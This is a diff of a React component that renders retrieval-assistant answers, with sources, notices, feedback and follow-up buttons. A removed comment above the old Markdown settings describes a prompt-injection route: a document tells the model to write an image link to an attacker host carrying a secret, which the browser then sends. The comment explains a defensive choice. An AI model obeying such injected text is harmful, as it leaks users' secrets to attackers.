@@ -1,10 +1,7 @@
-import { useMemo, useState, type ReactNode, type Ref } from "react"
-import ReactMarkdown, { type Components } from "react-markdown"
-import remarkGfm from "remark-gfm"
+import { useMemo, useState, type CSSProperties, type ReactNode, type Ref } from "react"
 import {
   BadgeCheck,
   BookOpen,
-  Check,
   ChevronLeft,
   ChevronRight,
   Clock,
@@ -15,9 +12,7 @@ import {
   Gauge,
   GitBranch,
   Globe,
-  History,
   Info,
-  Loader2,
   Lock,
   MoreHorizontal,
   RefreshCw,
@@ -25,26 +20,27 @@ import {
   SearchX,
   Share2,
   ShieldAlert,
-  Sparkles,
   ThumbsDown,
   ThumbsUp,
   TriangleAlert,
 } from "lucide-react"
 import { toast } from "sonner"
 
-import { CitationChip, SourceSheet } from "@/components/citations"
+import "@/components/chat-motion.css"
+import { AsciiSpinner } from "@/components/ascii/ascii-spinner"
+import { Markdown } from "@/components/chat-markdown"
+import { StepsTrace } from "@/components/chat-steps"
+import { SourceSheet } from "@/components/citations"
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
-import { Badge } from "@/components/ui/badge"
 import { Button } from "@/components/ui/button"
-import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/collapsible"
 import {
   DropdownMenu,
   DropdownMenuContent,
   DropdownMenuItem,
   DropdownMenuTrigger,
 } from "@/components/ui/dropdown-menu"
+import { Message as MessageRow, MessageContent, MessageFooter } from "@/components/ui/message"
 import { Popover, PopoverContent, PopoverTrigger } from "@/components/ui/popover"
-import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
 import { Textarea } from "@/components/ui/textarea"
 import { ToggleGroup, ToggleGroupItem } from "@/components/ui/toggle-group"
 import { Tooltip, TooltipContent, TooltipTrigger } from "@/components/ui/tooltip"
@@ -55,16 +51,15 @@ import {
   type FeedbackReason,
   type Source,
   type Step,
-  type StepLine,
   type VerifiedBadge,
 } from "@/lib/api"
 import { branchOf } from "@/lib/chat-history"
-import { CitationsContext, citedNumber, placeOf, remarkCitations } from "@/lib/citations"
+import type { LiveStep } from "@/lib/chat-steps"
+import { CitationsContext, placeOf } from "@/lib/citations"
+import { cn } from "@/lib/utils"
 
-// One line of the steps panel, live while the assistant works.
-export interface LiveStep extends StepLine {
-  done: boolean
-}
+// One line of the steps, live while the assistant works (lib/chat-steps.ts).
+export type { LiveStep }
 
 // A message as the chat shows it: a question, or an answer (streaming, or finished
 // in one of the AnswerStates).
@@ -96,6 +91,7 @@ export interface Message {
 export interface AnswerActions {
   onRetry?: (message: Message) => void
   onRephrase?: (question: string) => void
+  onAskEverywhere?: (question: string) => void // set when the chat is in a space
   onFeedback?: (message: Message, feedback: Feedback | null) => void
   onRegenerate?: (message: Message) => void
   onShare?: (message: Message) => void
@@ -108,182 +104,90 @@ export interface AnswerActions {
   hideSteps?: boolean // the workspace's admin turned the steps panel off for members
 }
 
-// One line of the sources under an answer. A cited passage opens in the source
-// viewer (numbered like its [S#] chips); a page read whole opens its link.
-function SourceCard({
-  source,
-  index,
+// The sources under an answer, kept quiet: one small pill per document, its cited
+// passages as numbered buttons (named like its [S#] chips) that open the source
+// viewer; a page read whole links out instead.
+function sourceLabel(source: Source) {
+  return source.kind === "general_knowledge" ? `General knowledge · ${source.provider}` : source.provider
+}
+
+function SourceGroup({
+  sources,
   onOpen,
 }: {
-  source: Source
-  index: number
+  sources: { source: Source; n: number }[]
   onOpen: (source: Source) => void
 }) {
-  const general = source.kind === "general_knowledge"
-  const isWiki = source.provider.toLowerCase().includes("outline")
-  const Icon = general ? Globe : isWiki ? BookOpen : FileText
-  const label = general ? `General knowledge · ${source.provider}` : source.provider
-  const place = placeOf(source)
-  const passage = source.chunk_id || source.snippet
-  const body = (
-    <div className="flex items-center gap-3 rounded-lg border bg-card px-3 py-2 text-left text-sm transition-colors hover:bg-muted/60">
-      <span className="flex size-6 shrink-0 items-center justify-center rounded-md bg-muted text-xs font-medium tabular-nums">
-        {source.n ?? index}
-      </span>{" "}
-      <Icon className="size-4 shrink-0 text-muted-foreground" />
-      {/* On a phone the provider goes under the title, so the title keeps the width.
-          The spaces keep the words apart in the text a screen reader checks the
-          button's name against. */}
-      <span className="min-w-0 flex-1">
-        <span className="block truncate font-medium">{source.title}</span>{" "}
-        {place && <span className="block truncate text-xs text-muted-foreground">{place}</span>}{" "}
-        <span className="block truncate text-xs text-muted-foreground sm:hidden">{label}</span>
-      </span>{" "}
-      <Badge
-        variant={general ? "outline" : "secondary"}
-        className="hidden max-w-[45%] sm:inline-flex"
-      >
-        <span className="truncate">{label}</span>
-      </Badge>
-      {source.url && !passage && <ExternalLink className="size-3.5 shrink-0 text-muted-foreground" />}
-    </div>
+  const first = sources[0].source
+  const general = first.kind === "general_knowledge"
+  const Icon = general ? Globe : first.provider.toLowerCase().includes("outline") ? BookOpen : FileText
+  const label = sourceLabel(first)
+  const linkOnly = !first.chunk_id && !first.snippet && first.url
+  const title = (
+    <>
+      <Icon className="size-3.5 shrink-0" />
+      <span className="max-w-[16rem] truncate">{first.title}</span>
+    </>
   )
-  if (passage) {
-    return (
-      <button
-        type="button"
-        onClick={() => onOpen(source)}
-        // All its visible text is in its name (WCAG 2.5.3), the provider too.
-        aria-label={`Open source ${source.n ?? index}: ${source.title}${place ? `, ${place}` : ""}, ${label}`}
-        className="min-w-0 rounded-lg outline-none focus-visible:ring-[3px] focus-visible:ring-ring/50"
-      >
-        {body}
-      </button>
-    )
-  }
-  return source.url ? (
-    <a href={source.url} target="_blank" rel="noreferrer" className="min-w-0">
-      {body}
-    </a>
-  ) : (
-    body
-  )
-}
-
-function StepRow({ step }: { step: LiveStep }) {
-  const blocked = step.result === "blocked by access rules" || step.result === "failed"
-  // The icon's shape and a screen-reader word carry the status, not only its colour.
   return (
-    <div className="flex items-start gap-2 text-xs">
-      <span className="mt-0.5 flex size-3.5 shrink-0 items-center justify-center">
-        {!step.done ? (
-          <Loader2 className="size-3.5 animate-spin text-muted-foreground" aria-hidden />
-        ) : blocked ? (
-          <TriangleAlert className="size-3.5 text-amber-600" aria-hidden />
-        ) : (
-          <Check className="size-3.5 text-emerald-600" aria-hidden />
-        )}
-        <span className="sr-only">{!step.done ? "Running:" : blocked ? "Problem:" : "Done:"}</span>
-      </span>
-      <span className={step.done ? "text-muted-foreground" : "text-foreground"}>
-        {step.label}
-        {step.done ? "" : "…"}
-        {step.result && <span className="text-muted-foreground/80"> · {step.result}</span>}
-      </span>
-    </div>
-  )
-}
-
-// What the assistant did: live while it works, then folded into one line. The raw
-// tool input and output ("Technical details") come from the server for admins only.
-function StepsPanel({ message }: { message: Message }) {
-  const steps = message.steps ?? []
-  const details = (message.trace ?? []).filter((t) => t.input !== undefined)
-  if (message.streaming) {
-    return (
-      <div className="space-y-1.5 rounded-xl border border-border/60 bg-muted/30 px-3 py-2.5">
-        {steps.length === 0 && (
-          <div className="flex items-center gap-2 text-xs text-foreground">
-            <Loader2 className="size-3.5 animate-spin text-muted-foreground" />
-            {message.status ?? "Thinking"}…
-          </div>
-        )}
-        {steps.map((st) => (
-          <StepRow key={st.id} step={st} />
-        ))}
-      </div>
-    )
-  }
-  // Admins: the answer came from the answer cache (its first raw step says so).
-  const cached = (message.trace ?? []).find((t) => t.tool === "answer_cache")
-  if (!steps.length)
-    return cached ? (
-      <p className="flex items-center gap-1.5 text-xs text-muted-foreground" title={cached.output}>
-        <History className="size-3.5 shrink-0" aria-hidden />
-        <Badge variant="outline" className="font-normal">
-          Cached
-        </Badge>
-        <span className="truncate">Reused a recent answer for the same access · no new search</span>
-      </p>
-    ) : null
-  const summary = steps.map((st) => st.label).join(" · ")
-  return (
-    <Collapsible>
-      <CollapsibleTrigger className="group flex max-w-full items-center gap-1.5 text-left text-xs text-muted-foreground hover:text-foreground">
-        <ChevronRight className="size-3.5 shrink-0 transition-transform group-data-[state=open]:rotate-90" />
-        <Check className="size-3.5 shrink-0 text-emerald-600" />
-        <span className="shrink-0">
-          {steps.length} step{steps.length === 1 ? "" : "s"}
+    <div className="inline-flex h-7 max-w-full min-w-0 items-center gap-1.5 rounded-full bg-foreground/5 pr-1 pl-2.5 text-xs text-muted-foreground">
+      {linkOnly ? (
+        <a
+          href={first.url!}
+          target="_blank"
+          rel="noreferrer"
+          aria-label={`${first.title}, ${label} (opens in a new tab)`}
+          className="flex min-w-0 items-center gap-1.5 rounded-sm outline-none hover:text-foreground focus-visible:ring-[3px] focus-visible:ring-ring/50"
+        >
+          {title}
+          <ExternalLink className="size-3 shrink-0" />
+        </a>
+      ) : (
+        <span className="flex min-w-0 items-center gap-1.5" title={`${first.title} · ${label}`}>
+          {title}
         </span>
-        <span className="truncate">· {summary}</span>
-      </CollapsibleTrigger>
-      <CollapsibleContent className="mt-2 space-y-2">
-        <div className="space-y-1.5 rounded-xl border border-border/60 bg-muted/30 px-3 py-2.5">
-          {message.standalone && (
-            <p className="text-xs text-muted-foreground">
-              Searched for: <span className="text-foreground">{message.standalone}</span>
-            </p>
-          )}
-          {steps.map((st) => (
-            <StepRow key={st.id} step={st} />
-          ))}
-        </div>
-        {details.length > 0 && (
-          <Collapsible>
-            <CollapsibleTrigger className="group flex items-center gap-1.5 text-xs text-muted-foreground hover:text-foreground">
-              <ChevronRight className="size-3.5 shrink-0 transition-transform group-data-[state=open]:rotate-90" />
-              Technical details
-            </CollapsibleTrigger>
-            <CollapsibleContent className="mt-2 space-y-2">
-              {details.map((step, i) => (
-                <div key={i} className="rounded-lg border bg-muted/40 p-3 text-xs">
-                  <div className="mb-1 flex items-center gap-2">
-                    <span className="font-medium">Step {i + 1}</span>
-                    <Badge variant="outline" className="font-mono">
-                      {step.tool}
-                    </Badge>
-                  </div>
-                  <p className="font-mono text-muted-foreground">
-                    input: {JSON.stringify(step.input)}
-                  </p>
-                  <p className="mt-1 whitespace-pre-wrap break-words text-muted-foreground">
-                    {step.output}
-                  </p>
-                </div>
-              ))}
-            </CollapsibleContent>
-          </Collapsible>
-        )}
-      </CollapsibleContent>
-    </Collapsible>
+      )}
+      {!linkOnly &&
+        sources.map(({ source, n }) => {
+          const place = placeOf(source)
+          return (
+            <Tooltip key={source.chunk_id ?? n}>
+              <TooltipTrigger asChild>
+                <button
+                  type="button"
+                  onClick={() => onOpen(source)}
+                  // All its visible text is in its name (WCAG 2.5.3), the provider too.
+                  aria-label={`Open source ${n}: ${source.title}${place ? `, ${place}` : ""}, ${label}`}
+                  className="flex size-5 shrink-0 items-center justify-center rounded-full font-mono text-[11px] tabular-nums transition-colors duration-(--dur-hover) ease-(--ease-hover) outline-none hover:bg-foreground/10 hover:text-foreground focus-visible:ring-[3px] focus-visible:ring-ring/50"
+                >
+                  {n}
+                </button>
+              </TooltipTrigger>
+              <TooltipContent side="top">{place || label}</TooltipContent>
+            </Tooltip>
+          )
+        })}
+    </div>
   )
+}
+
+// Sources in citation order, grouped by document (first appearance wins the order).
+function groupSources(sources: Source[]) {
+  const groups = new Map<string, { source: Source; n: number }[]>()
+  sources.forEach((source, i) => {
+    const key = `${source.provider}\u0000${source.title}\u0000${source.url ?? ""}`
+    const list = groups.get(key) ?? []
+    list.push({ source, n: source.n ?? i + 1 })
+    groups.set(key, list)
+  })
+  return [...groups.values()]
 }
 
 // Too many questions in the last minute: a pause, not a failure, so no red.
 function LimitNotice({ text, plan = false }: { text: string; plan?: boolean }) {
   const Icon = plan ? Gauge : Clock
   return (
-    <div className="flex items-start gap-2.5 rounded-xl border border-border/60 bg-muted/30 px-3 py-2.5 text-sm">
+    <div className="glass-subtle flex items-start gap-2.5 rounded-xl px-3 py-2.5 text-sm">
       <Icon className="mt-0.5 size-4 shrink-0 text-muted-foreground" />
       <div className="min-w-0 space-y-0.5">
         <p className="font-medium">{plan ? "Your plan's limit" : "Give it a moment"}</p>
@@ -293,59 +197,36 @@ function LimitNotice({ text, plan = false }: { text: string; plan?: boolean }) {
   )
 }
 
-// A one-line note above an answer that is only partly from the documents.
-function AnswerNote({ icon: Icon, children }: { icon: typeof Info; children: string }) {
+// A mono line above an answer that is only partly from the documents, or not from
+// them at all: a glyph, the icon and the words, in the state's colour.
+function AnswerNote({
+  icon: Icon,
+  tone,
+  children,
+}: {
+  icon: typeof Info
+  tone: string
+  children: string
+}) {
   return (
-    <p className="flex items-center gap-1.5 text-xs font-medium text-muted-foreground">
-      <Icon className="size-3.5 shrink-0" />
+    <p className={cn("mb-3 flex items-center gap-1.5 font-mono text-xs", tone)}>
+      <Icon className="size-3.5 shrink-0" aria-hidden />
       {children}
     </p>
   )
 }
 
-// Answers never load images or render raw HTML: a document could tell the model to
-// write ![](https://attacker/?q=<secret>), and the browser would send it on its own.
-// An image shows as its alt text instead.
-// A [S#] marker (made a "#cite-#" link by remarkCitations) is a citation chip.
-// Tables (e.g. rows quoted from an attached spreadsheet, C24) as the app's own
-// tables: wide ones scroll sideways inside the answer, not the page.
-const ANSWER_MARKDOWN: Components = {
-  img: ({ alt }) => (alt ? <span className="text-muted-foreground">[{alt}]</span> : null),
-  table: ({ children }) => (
-    <div className="my-3 rounded-lg border border-border/70">
-      <Table>{children}</Table>
-    </div>
-  ),
-  thead: ({ children }) => <TableHeader className="bg-muted/50">{children}</TableHeader>,
-  tbody: ({ children }) => <TableBody>{children}</TableBody>,
-  tr: ({ children }) => <TableRow>{children}</TableRow>,
-  th: ({ children }) => <TableHead className="h-8 px-3">{children}</TableHead>,
-  td: ({ children }) => <TableCell className="px-3 py-1.5 whitespace-normal">{children}</TableCell>,
-  a: ({ href, title, children }) => {
-    const n = citedNumber(href)
-    return n ? (
-      <CitationChip n={n} />
-    ) : (
-      <a href={href} title={title}>
-        {children}
-      </a>
-    )
-  },
-}
-
-function Markdown({ text, streaming }: { text: string; streaming?: boolean }) {
+// The reading column: opaque, so the background field never moves under the words,
+// with mono ┌ ┐ └ ┘ marks at its corners.
+function ReadingColumn({ children, className }: { children: ReactNode; className?: string }) {
+  const mark = "pointer-events-none absolute font-mono text-[0.625rem] leading-none text-muted-foreground/50 select-none"
   return (
-    <div className="max-w-none text-sm leading-relaxed [&_a]:underline [&_li]:my-0.5 [&_ol]:list-decimal [&_ol]:pl-5 [&_p]:my-2 [&_ul]:list-disc [&_ul]:pl-5">
-      <ReactMarkdown
-        remarkPlugins={[remarkGfm, remarkCitations]}
-        skipHtml
-        components={ANSWER_MARKDOWN}
-      >
-        {text}
-      </ReactMarkdown>
-      {streaming && (
-        <span className="ml-0.5 inline-block h-4 w-1.5 translate-y-0.5 animate-pulse rounded-sm bg-foreground/60" />
-      )}
+    <div data-slot="reading-column" className={cn("relative rounded-xl border border-border/70 bg-background px-4 py-3.5 sm:px-5", className)}>
+      <span aria-hidden className={cn(mark, "top-1 left-1.5")}>┌</span>
+      <span aria-hidden className={cn(mark, "top-1 right-1.5")}>┐</span>
+      <span aria-hidden className={cn(mark, "bottom-1 left-1.5")}>└</span>
+      <span aria-hidden className={cn(mark, "right-1.5 bottom-1")}>┘</span>
+      {children}
     </div>
   )
 }
@@ -476,8 +357,7 @@ function FeedbackRow({
                 Remove
               </Button>
             )}
-            <Button size="sm" disabled={saving} onClick={() => send(-1)}>
-              {saving && <Loader2 className="animate-spin" />}
+            <Button size="sm" loading={saving} onClick={() => send(-1)}>
               Send feedback
             </Button>
           </div>
@@ -503,15 +383,18 @@ function RetryButton({
 }
 
 // The body of an answer, by how it ended (C5). "Not found", "blocked" and failures
-// are notices, so they can't be mistaken for an answer from the documents.
-function AnswerBody({ message, actions }: { message: Message; actions: AnswerActions }) {
+// are notices, each its own shape, so they can't be mistaken for an answer from the
+// documents; an answer is in the opaque reading column. `live`: written on this
+// screen, so a notice fades in as it arrives (never on history).
+function AnswerBody({ message, actions, live }: { message: Message; actions: AnswerActions; live: boolean }) {
   const { state, text } = message
+  const arrive = live ? "kb-fade-slow" : undefined
   if (message.withheld) {
     // Decision D1: the whole answer is withheld, not only its sources: its text was
     // written from them.
     const ask = actions.onAskYourself
     return (
-      <Alert>
+      <Alert className={cn("px-3 py-2.5", arrive)}>
         <Lock />
         <AlertTitle>{ask ? "You don't have access to some sources" : "Answer hidden"}</AlertTitle>
         <AlertDescription>
@@ -530,8 +413,9 @@ function AnswerBody({ message, actions }: { message: Message; actions: AnswerAct
     )
   }
   if (state === "blocked") {
+    // A guard refused: a warning edge, not an error.
     return (
-      <Alert>
+      <Alert className={cn("border-warning/40 border-l-2 border-l-warning px-3 py-2.5 *:[svg]:text-warning", arrive)}>
         <ShieldAlert />
         <AlertTitle>Can't answer that</AlertTitle>
         <AlertDescription>{text}</AlertDescription>
@@ -539,13 +423,19 @@ function AnswerBody({ message, actions }: { message: Message; actions: AnswerAct
     )
   }
   if (state === "not_found") {
+    // Nothing in the documents: a dashed outline, the shape of something missing.
     return (
-      <Alert>
+      <Alert className={cn("border-dashed border-border bg-background px-3 py-2.5 *:[svg]:text-muted-foreground", arrive)}>
         <SearchX />
         <AlertTitle>Your documents don't cover this</AlertTitle>
         <AlertDescription>
-          <Markdown text={text} />
+          <Markdown text={text} className="text-sm text-muted-foreground" />
           <div className="mt-2 flex flex-wrap gap-2">
+            {message.question && actions.onAskEverywhere && (
+              <Button variant="outline" size="sm" onClick={() => actions.onAskEverywhere!(message.question!)}>
+                Ask in All company
+              </Button>
+            )}
             {message.question && actions.onRephrase && (
               <Button variant="outline" size="sm" onClick={() => actions.onRephrase!(message.question!)}>
                 Rephrase
@@ -575,7 +465,7 @@ function AnswerBody({ message, actions }: { message: Message; actions: AnswerAct
   }
   if (state === "error") {
     return (
-      <Alert variant="destructive">
+      <Alert variant="destructive" className={cn("border-destructive/40 px-3 py-2.5", arrive)}>
         <TriangleAlert />
         <AlertTitle>Couldn't answer</AlertTitle>
         <AlertDescription>
@@ -591,49 +481,65 @@ function AnswerBody({ message, actions }: { message: Message; actions: AnswerAct
   }
   if (state === "pending") {
     return (
-      <p className="flex items-center gap-2 text-sm text-muted-foreground">
-        <Loader2 className="size-4 animate-spin" />
-        Still being written. Reload in a moment to see it.
+      <p className="flex items-center gap-2 font-mono text-xs text-muted-foreground">
+        <AsciiSpinner size="xs" label="" className="text-signal" />
+        <span className="shimmer motion-reduce:shimmer-none">Still being written. Reload in a moment to see it.</span>
       </p>
     )
   }
   if (message.verified) {
-    // C18: an approved answer, in a bordered panel that says who verified it and when.
+    // C18: an approved answer, in a panel that says who verified it and when.
     const v = message.verified
     const date = new Date(v.at * 1000).toLocaleDateString(undefined, { day: "numeric", month: "short" })
     return (
-      <div className="rounded-xl border border-foreground/15 bg-background" aria-label="Verified answer">
-        <div className="flex flex-wrap items-center gap-x-2 gap-y-0.5 border-b border-border/70 px-3 py-2 text-xs">
-          <BadgeCheck className="size-4 text-foreground" aria-hidden />
-          <span className="font-medium text-foreground">
-            Verified by {v.by} · {date}
-          </span>
-          <span className="min-w-0 truncate text-muted-foreground">{v.title}</span>
+      <ReadingColumn className="border-signal/35 p-0 sm:p-0">
+        <div aria-label="Verified answer">
+          <div className="flex flex-wrap items-center gap-x-2 gap-y-0.5 border-b border-border/70 px-4 py-2 font-mono text-xs sm:px-5">
+            <BadgeCheck className="size-4 text-signal" aria-hidden />
+            <span className="font-medium text-foreground">
+              Verified by {v.by} · {date}
+            </span>
+            <span className="min-w-0 truncate text-muted-foreground">{v.title}</span>
+          </div>
+          <div className="px-4 py-3.5 sm:px-5">
+            <Markdown text={text} streaming={message.streaming} />
+          </div>
         </div>
-        <div className="px-3 py-2.5">
-          <Markdown text={text} />
-        </div>
-      </div>
+      </ReadingColumn>
     )
   }
+  // An answer: written, still streaming in, partly from the documents, from general
+  // knowledge, or stopped part way. One element throughout, so the final, checked
+  // text replaces the streamed draft in place.
   return (
-    <div className="space-y-2">
+    <ReadingColumn
+      className={cn(
+        message.streaming && live && "kb-fade",
+        state === "partial" && "border-warning/30",
+        state === "stopped" && "border-dashed",
+      )}
+    >
       {state === "partial" && (
-        <AnswerNote icon={Info}>Partly answered: the documents don't cover all of it</AnswerNote>
+        <AnswerNote icon={Info} tone="text-warning">
+          Partly answered: the documents don't cover all of it
+        </AnswerNote>
       )}
       {state === "general_knowledge" && (
-        <AnswerNote icon={Globe}>General knowledge, not from your documents</AnswerNote>
+        <AnswerNote icon={Globe} tone="text-muted-foreground">
+          General knowledge, not from your documents
+        </AnswerNote>
       )}
       {text && <Markdown text={text} streaming={message.streaming} />}
       {state === "stopped" && (
-        <div className="flex flex-wrap items-center gap-2">
-          <span className="text-xs font-medium text-muted-foreground">
+        <div className={cn("flex flex-wrap items-center gap-2", text && "mt-3 border-t border-dashed border-border/70 pt-3")}>
+          <span className="font-mono text-xs text-muted-foreground">
+            <span aria-hidden>■ </span>
             {text ? "Stopped before the end" : "Stopped"}
           </span>
           {message.id && actions.onRetry && <RetryButton message={message} onRetry={actions.onRetry} />}
         </div>
       )}
-    </div>
+    </ReadingColumn>
   )
 }
 
@@ -725,12 +631,12 @@ async function copyAnswer(message: Message) {
 }
 
 // Under a finished answer: Copy, thumbs, Regenerate, Share, More, and its versions.
-function ActionRow({ message, actions }: { message: Message; actions: AnswerActions }) {
+function ActionRow({ message, actions, className }: { message: Message; actions: AnswerActions; className?: string }) {
   const state = message.state
   const shareable = !!state && SHAREABLE.includes(state) && !message.withheld
   const rateable = !!state && RATEABLE.includes(state) && !message.withheld
   return (
-    <div className="flex flex-wrap items-center gap-0.5 text-muted-foreground" data-print="hide">
+    <MessageFooter className={cn("flex-wrap gap-0.5 px-0 font-normal", className)} data-print="hide">
       {shareable && (
         <IconAction label="Copy" onClick={() => copyAnswer(message)}>
           <Copy />
@@ -776,7 +682,7 @@ function ActionRow({ message, actions }: { message: Message; actions: AnswerActi
         </DropdownMenu>
       )}
       <BranchNav message={message} onBranch={actions.onBranch} disabled={actions.busy} />
-    </div>
+    </MessageFooter>
   )
 }
 
@@ -797,74 +703,99 @@ export function AssistantMessage({
   )
   const finished = !message.streaming && !message.limited
   const [opened, setOpened] = useState<Source | null>(null)
+  // Written on this screen: it mounted while streaming. Only such an answer animates
+  // what arrives (its sources, actions, follow-ups); history, a branch switch and an
+  // edited question never do.
+  const [live] = useState(!!message.streaming)
   const citations = useMemo(
     () => ({
       byNumber: new Map(sources.filter((s) => s.n !== undefined).map((s) => [s.n!, s])),
       open: setOpened,
+      live: !!message.streaming,
     }),
-    [sources],
+    [sources, message.streaming],
   )
+  // Step timings are this screen's own (saved steps have none): kept by step id, so
+  // they outlast the saved copy that replaces the streamed answer once it's done.
+  const [timings] = useState(() => new Map<string, Pick<LiveStep, "startedAt" | "ms">>())
+  const steps = (message.steps ?? []).map((st) => {
+    if (st.startedAt !== undefined) {
+      timings.set(st.id, { startedAt: st.startedAt, ms: st.ms })
+      return st
+    }
+    return timings.has(st.id) ? { ...st, ...timings.get(st.id) } : st
+  })
+  const followups =
+    finished && last && !actions.busy && actions.onFollowup && !message.withheld ? (message.followups ?? []) : []
+  const rise = (i: number, delay = 0) =>
+    live ? { className: "kb-rise", style: { "--i": Math.min(i, 5), "--d": `${delay}ms` } as CSSProperties } : {}
   return (
     <CitationsContext value={citations}>
-      <div
+      <MessageRow
         ref={ref}
         tabIndex={-1}
-        className="flex gap-3 rounded-lg outline-none focus-visible:ring-[3px] focus-visible:ring-ring/50"
+        className="gap-3 rounded-lg outline-none focus-visible:ring-[3px] focus-visible:ring-ring/50"
         data-state={message.state}
         aria-label="Answer"
       >
-        <div className="flex size-8 shrink-0 items-center justify-center rounded-full bg-primary text-primary-foreground">
-          <Sparkles className={message.streaming ? "size-4 animate-pulse" : "size-4"} />
-        </div>
-        <div className="min-w-0 flex-1 space-y-3 pt-1">
-          {!actions.hideSteps && <StepsPanel message={message} />}
+        <MessageContent className="gap-3 pt-1">
+          <StepsTrace
+            steps={steps}
+            streaming={!!message.streaming}
+            writing={!!message.text}
+            state={message.state}
+            status={message.status}
+            trace={message.trace}
+            standalone={message.standalone}
+            hideSteps={actions.hideSteps}
+            live={live}
+            sources={sources}
+          />
           {message.limited && (
             <LimitNotice text={message.limited} plan={message.limitedBy === "plan"} />
           )}
-          {!message.limited && (message.streaming ? message.text && <Markdown text={message.text} streaming /> : <AnswerBody message={message} actions={actions} />)}
+          {!message.limited && (!message.streaming || message.text) && (
+            <AnswerBody message={message} actions={actions} live={live} />
+          )}
 
           {sources.length > 0 && (
-            <div className="space-y-2">
-              <p className="text-xs font-medium uppercase tracking-wide text-muted-foreground">
-                Sources
-              </p>
-              <div className="grid min-w-0 grid-cols-1 gap-2">
-                {sources.map((s, i) => (
-                  <SourceCard
-                    key={s.chunk_id ?? `${s.provider}-${s.title}`}
-                    source={s}
-                    index={i + 1}
-                    onOpen={setOpened}
-                  />
-                ))}
-              </div>
+            <div className="flex min-w-0 flex-wrap items-center gap-1.5" role="group" aria-label="Sources">
+              <span className="mr-0.5 text-xs text-muted-foreground">Sources</span>
+              {groupSources(sources).map((group, i) => (
+                <div key={`${group[0].source.provider}-${group[0].source.title}`} className="min-w-0 max-w-full" {...rise(i)}>
+                  <SourceGroup sources={group} onOpen={setOpened} />
+                </div>
+              ))}
             </div>
           )}
 
           {finished && message.state && message.state !== "pending" && (
-            <ActionRow message={message} actions={actions} />
+            <ActionRow message={message} actions={actions} className={live ? "kb-fade" : undefined} />
           )}
 
-          {finished && last && !actions.busy && actions.onFollowup && !message.withheld
-            && (message.followups?.length ?? 0) > 0 && (
+          {followups.length > 0 && (
             <div className="flex flex-col items-start gap-1.5" aria-label="Follow-up questions" role="group" data-print="hide">
-              {message.followups!.map((f) => (
+              {followups.map((f, i) => (
                 <Button
                   key={f}
                   variant="outline"
                   size="sm"
                   onClick={() => actions.onFollowup!(f)}
-                  className="h-auto max-w-full justify-start whitespace-normal py-1.5 text-left font-normal pointer-coarse:min-h-10"
+                  {...rise(i, 100)}
+                  className={cn(
+                    "glass-subtle h-auto max-w-full justify-start whitespace-normal py-1.5 text-left font-normal pointer-coarse:min-h-10",
+                    live && "kb-rise",
+                  )}
                 >
-                  <CornerDownRight data-icon="inline-start" className="text-muted-foreground" />
+                  <CornerDownRight data-icon="inline-start" className="text-signal" />
                   {f}
                 </Button>
               ))}
             </div>
           )}
-        </div>
+        </MessageContent>
         <SourceSheet source={opened} onOpenChange={(open) => !open && setOpened(null)} />
-      </div>
+      </MessageRow>
     </CitationsContext>
   )
 }
